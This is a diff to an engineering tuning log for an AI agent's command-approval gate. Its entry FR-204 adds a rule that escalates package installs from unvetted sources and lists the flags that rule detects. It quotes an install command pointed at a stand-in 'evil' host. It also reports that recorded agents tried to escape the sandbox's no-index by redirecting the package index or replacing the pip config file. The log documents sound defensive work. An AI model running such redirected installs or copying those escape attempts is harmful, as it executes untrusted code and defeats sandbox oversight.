@@ -5,6 +5,62 @@ One row per tuning cycle: hypothesis, change, before, after, kept or reverted.
 
 ---
 
+## FR-204: where a package comes from (2026-09-24)
+
+**Hypothesis**: `pip install --index-url http://evil/ x` was `auto`, so arbitrary
+code from an arbitrary host executed with no pause. Escalating the SOURCE, and
+only the source, closes that without touching the ordinary case.
+
+This is not FR-204 as written. §8.2 resolved that on 2026-08-31 - packages are
+baked at build time, and a scored container has no-index, a read-only root and
+an allowlisted egress. The hole is in INTERACTIVE use, where the gate is the
+whole boundary and nothing else stops a redirected index.
+
+**Change**: one named rule in `DANGER`, so the reason reads `run_shell is
+destructive (a package from an unvetted source)`. It fires on `--index-url`,
+`--extra-index-url`, `--find-links`, `--trusted-host`, `--registry`, `-i`, a
+`http(s)`/`git+`/`file`/`ssh` URL, a `.whl`/`.tar.gz`/`.tgz` archive, or
+`PIP_CONFIG_FILE=`. `pip`, `uv pip`, `npm`, `pnpm`, `yarn`.
+
+**Narrow on purpose.** `missing-dep` is SOLVED by the agent running
+`pip install -r requirements.txt`, and a blanket `confirm` becomes `deny` in
+autonomous mode, so a wide rule fails a case that passes today. 58 of the 92
+package-manager commands in 7,290 recorded executions are that one command.
+
+**Replayed before shipping**, the way the hardline tier was: 7,369 recorded
+executions, **6 escalated, every one genuine** - four `--index-url` at real
+PyPI and two replacing `PIP_CONFIG_FILE`, all of them an agent trying to get
+out of the sandbox's no-index. Zero of the 79 executions in the 18 rows
+measured today.
+
+**I got the first version wrong, and the measurement did not catch it.** It had
+a clause for a bare local path, which matches every FLAG that takes one:
+`pip install -r ./requirements.txt`, `-r /app/requirements.txt` and
+`--target /tmp/libs` were all denied. `missing-dep` scored 3/3 only because the
+model wrote `requirements.txt` with no path prefix in all three runs - a seed
+that writes `./requirements.txt` fails the case. Found by probing near-miss
+forms by hand AFTER the split came back clean. The clause is gone; a local
+directory grants nothing `run_shell` does not already have in a writable
+workspace, and an archive is still caught.
+
+**Before/after**: dev **13/15**, and that number is not the bar - I launched
+without `AGENT_MAX_TURNS=30`, so the fixture's own `max_turns: 12` bound. Four
+cases went 12/12 at that TIGHTER cap; `add-endpoint` scored 1/3 with turns
+[12, 13, 12], against 0/3 documented at cap 12. Re-run at the baseline's cap,
+`add-endpoint` is **3/3** (`done` x3, turns 18/15/18, zero tamper), and the
+composite is **15/15** - assembled from two passes, not one 15-row pass, and
+recorded that way.
+
+`missing-dep` **3/3**, with `pip install -r requirements.txt` classified `auto`
+in all three runs. The rule fired **0 times in 210 calls across 18 rows**; the
+6 non-`auto` verdicts in those rows are hallucinated tool names (`finish`,
+`ls`), nothing to do with it.
+
+**Kept.** Schema budget unchanged at **5,572 of 10,000** - a policy rule is not
+a tool and costs nothing per turn. 1,193 -> 1,222 tests. Two mutations: widen
+the source clause to any `install` and 14 tests go red; put the bare-path
+clause back and the 5 new params go red.
+
 ## FR-307: correcting a call at the approval point (2026-09-24)
 
 **Not a tuning cycle.** An interface, and a branch of the gate that had been
